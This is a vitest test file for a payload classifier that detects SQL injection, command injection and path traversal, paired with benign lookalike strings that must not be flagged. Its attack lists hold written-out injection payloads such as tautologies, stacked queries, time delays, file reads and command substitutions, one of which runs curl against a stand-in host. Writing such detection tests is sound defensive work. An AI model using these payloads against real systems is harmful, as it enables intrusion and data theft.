import { describe, expect, it } from 'vitest';
import { classifyPayload } from '../../server/services/payloadClassifier.service.js';
import { analyseSqlStructure } from '../../server/services/sqlStructure.js';

/**
 * Both directions, as the detection-engineering skill requires. None of these strings is
 * copied from an evaluation set: the attacks are written here against the *technique*, with
 * values and aliases of our own, and the benign half is text that resembles SQL closely
 * enough to be the false positives a structural detector would be expected to make.
 */

const blocked = (p: string) => classifyPayload(p).malicious;

describe('structural SQL injection — attacks the signature rules missed', () => {
  const attacks: Array<[string, string]> = [
    ['numeric tautology, no quote', '7 or 41=41'],
    ['tautology behind a closed quote and parenthesis', "abc') or 12=12"],
    ['false-condition probe behind double parens', 'x")) and 100=200'],
    ['string tautology with dangling quote', "u' and 'pq'='pq"],
    ['LIKE tautology with dangling quote', 'u") or ("ab" like "ab'],
    ['WHERE with constant test after alias', '5) as t0 where 31=31'],
    ['constant compared with subquery', '9 and 77=(select count(*) from accounts)'],
    ['constant compared with function result', "z' or 5=length(database())--"],
    ['scalar subquery concatenated into a string', "q'||(select 'm' from dual where 8=8)||'"],
    ['stacked statement', "1'; select pg_read_file('x')--"],
    ['stacked declare', '1; declare @v varchar(20)'],
    ['time delay, T-SQL form', "k'); waitfor delay '0:0:9'--"],
    ['SQL-only function', '3 and updatexml(1,concat(0x7e,version()),1)'],
    ['oracle package call', '4 or 6=dbms_pipe.receive_message(chr(65),3)'],
    ['case expression', 'n) and (case when (2=2) then 1 else 0 end)=1'],
    ['order by column index probe', "r') order by 7--"],
    ['catalog enumeration', '2 and 1=(select count(*) from sysibm.systables)'],
    ['upper case and tabs', "ABC')\tOR\t55=55"],
    ['percent-encoded', 'id=3%20or%2019%3D19'],
    ['inline comments instead of spaces', '8/**/or/**/64=64']
  ];
  for (const [name, payload] of attacks) {
    it(`blocks: ${name}`, () => expect(blocked(payload)).toBe(true));
  }

  it('reports what it saw, not just a score', () => {
    const r = classifyPayload("abc') or 12=12");
    expect(r.family).toBe('SQL_INJECTION');
    expect(r.signatures).toContain('boolean test between two constants');
  });
});

describe('structural SQL injection — text that must still pass', () => {
  const benign: string[] = [
    // names, addresses, ordinary parameter values
    "o'brien and sons", "d'or", "côte d'or", "l'oréal paris", "rock 'n' roll", "5 o'clock",
    "Mary's (new) phone", 'c/ mayor 12, 3º b', 'calle 5 (esquina 7)', 'john.smith@example.com',
    'شارع الملك فهد، الرياض', 'مرحبا (اختبار) 1=1؟ لا', '2020-11-15 10:30:00', '+966 50 123 4567',
    // prose that mentions SQL
    'Please select one option from the list', 'How do I select all rows from a table?',
    'The union of sets A and B', 'drop me a line or call 555', 'I like (really like) this',
    'We selected (and then updated) the order by hand', 'Order by date, group by team.',
    'Where can I find it? In the box or on the shelf', 'insert coin; select player; start',
    'This and that; begin again tomorrow', 'case closed; when in doubt, ask',
    'Use count() to count things and length() for size.', 'exec summary; create value',
    // arithmetic, comparisons, code-ish values that are not SQL injection
    '2+2=4', '10-5', 'x=1&y=2&z=3', 'a=1 or b=2', 'price>=10 and price<=20', 'width=100;height=200',
    'page=2&sort=name&order=asc', 'f(x)=y', 'max(1,2)', '(a) (b) (c)', 'version 1.2.3 (build 45)',
    'if 5 > 3 then ok', 'rating 4/5 or 5/5', 'score: 3 = good, 4 = great',
    // structured bodies
    '{"name":"Ali","age":30,"tags":["a","b"]}', '{"filter":{"status":"open"},"limit":20}',
    'GET /api/v1/users?select=name,email&order=created', '/search?q=union+station&in=boston',
    // A catalog name in a URL path is not SQL. (This case used to end in "?dir=http://host/x",
    // adapted from a second-source line labelled benign; that line was a scanner's RFI probe,
    // which the remote-file-inclusion rule now flags correctly, so the URL was removed.)
    '/items?where=color:red&limit=10', '/files/all_users/report.php?dir=reports', 'SELECT', 'select', 'where', "it's"
  ];
  for (const payload of benign) {
    it(`passes: ${payload}`, () => {
      const r = classifyPayload(payload);
      expect(r.malicious, `${r.score} ${r.signatures.join(' | ')}`).toBe(false);
      // Also under the lower threshold the analyze route applies to vector=UNKNOWN.
      expect(r.score, r.signatures.join(' | ')).toBeLessThan(25);
    });
  }
});

describe('structural SQL analysis — cost is bounded', () => {
  // Catastrophic (super-linear) behaviour shows up as seconds: 200 KB of ")" took 2.1 s before the
  // run-end fix. Ordinary linear cost on a loaded test runner reaches ~250 ms, so the bound is set
  // to catch the former without flaking on the latter.
  it('stays fast on large adversarial input', () => {
    const inputs = [
      ')'.repeat(200_000),
      ")'".repeat(150_000),
      "'".repeat(200_000),
      '('.repeat(200_000),
      'select '.repeat(40_000),
      '1=1 or '.repeat(40_000),
      "a' or '".repeat(40_000),
      '/*'.repeat(100_000),
      '0x' + 'a'.repeat(300_000)
    ];
    for (const s of inputs) {
      const t0 = performance.now();
      analyseSqlStructure(s);
      classifyPayload(s);
      expect(performance.now() - t0).toBeLessThan(500);
    }
  });

  it('returns nothing for text with no SQL syntax characters', () => {
    expect(analyseSqlStructure('hello world this is plain text')).toEqual([]);
    expect(analyseSqlStructure('')).toEqual([]);
  });
});

describe('command injection and traversal shapes', () => {
  const attacks = [
    '; /bin/cat /etc/hosts', 'x|/usr/bin/whoami', 'a && uname -a', 'q; ls -la /tmp', 'v|id|', ';ps;',
    '`whoami`', '$(curl http://10.0.0.9/x)', 'f || ping -c 3 10.0.0.1', '& dir c:\\users',
    '/..../..../boot', '/.../.../.../secret', '..0x2f..0x2fconf', 'WEB-INF/web.xml'
  ];
  for (const p of attacks) it(`blocks: ${p}`, () => expect(blocked(p)).toBe(true));

  const benign = [
    'name;id', 'user|id', 'cat|dog', 'Name & ID', 'R&D ps team', 'the `id` field is required', '`true`', '`false`',
    'sort=name;type', 'ls', 'id', 'ping me later; sleep well', 'tom & cat; dog', 'a;b;c', 'x|y|z',
    '../images/logo.png', './docs/../readme.md', 'wait... what/ok... fine/', 'see /usr/share/doc', 'bash scripting; curl basics',
    'echo', 'type: admin; id: 5', 'dir=asc', 'q=cat -n', 'C:\\Users\\ali\\file.txt', 'version 0x2e'
  ];
  for (const p of benign) {
    it(`passes: ${p}`, () => {
      const r = classifyPayload(p);
      expect(r.score, r.signatures.join(' | ')).toBeLessThan(25);
    });
  }
});

describe('structural SQL analysis — padding cannot hide an injection', () => {
  const injection = "x') or 12=12";
  const fill = (n: number, unit: string) => unit.repeat(Math.ceil(n / unit.length)).slice(0, n);
  const fillers: Record<string, string> = {
    letters: 'lorem ipsum dolor ',
    json: '{"k":"v","n":1},',
    quotes: "a'b\"c(d)e=f;",
    spaces: ' '
  };

  for (const [name, unit] of Object.entries(fillers)) {
    for (const size of [5_000, 100_000, 2_000_000]) {
      it(`blocks an injection after ${size} chars of ${name} filler`, () => {
        expect(blocked(fill(size, unit) + ' ' + injection)).toBe(true);
      });
    }
    it(`blocks an injection in the middle of 200 KB of ${name} filler`, () => {
      expect(blocked(fill(100_000, unit) + ' ' + injection + ' ' + fill(100_000, unit))).toBe(true);
    });
  }

  it('does not add up weak hints spread through a long benign document', () => {
    const record = (i: number) => `{"id":${i},"name":"o'brien ${i}","note":"select one (or two) items; order by date","qty":${i % 7}}`;
    const body = '[' + Array.from({ length: 3000 }, (_, i) => record(i)).join(',') + ']';
    expect(body.length).toBeGreaterThan(250_000);
    const r = classifyPayload(body);
    expect(r.score, r.signatures.join(' | ')).toBeLessThan(25);
  });

  it('keeps structural cost bounded on very large adversarial input', () => {
    for (const unit of Object.values(fillers)) {
      const big = fill(8_000_000, unit) + injection;
      const t0 = performance.now();
      const sig = analyseSqlStructure(big);
      expect(performance.now() - t0).toBeLessThan(2000);
      expect(sig.length).toBeGreaterThan(0);
    }
  });
});

describe('structural SQL analysis — prose that looks like a select list or a call', () => {
  // Found by the long-document test above: "select one (or two)" read as SELECT one(…),
  // because the tokenizer drops whitespace. Calls now need `name(` with no space.
  const benign = [
    'Please select one (or more) options', 'select one (or two) items; order by date',
    'select (or deselect) all rows', 'select 2 or more options', 'Select "Save" to continue',
    'select case studies (2020)', 'select null values only', 'I need sleep (a lot) tonight',
    'rating 5 = excellent (best)', 'benchmark (2024) results', 'select * to mark all',
    '{"help":"select one (or more) items, then press OK"}'
  ];
  for (const p of benign) {
    it(`passes: ${p}`, () => {
      const r = classifyPayload(p);
      expect(r.score, r.signatures.join(' | ')).toBeLessThan(25);
    });
  }
  const attacks = [
    "1' union select 1,2,3--", "x' and 1=(select null from dual)--", '5 and 9=(select (case when (1=1) then 1 else 0 end))',
    "k') or 3=extractvalue (1,concat(0x7e,version()))", '7 or 4=sleep(3)', "q' and 'a'=(select 'a' from dual)--"
  ];
  for (const p of attacks) it(`blocks: ${p}`, () => expect(blocked(p)).toBe(true));
});
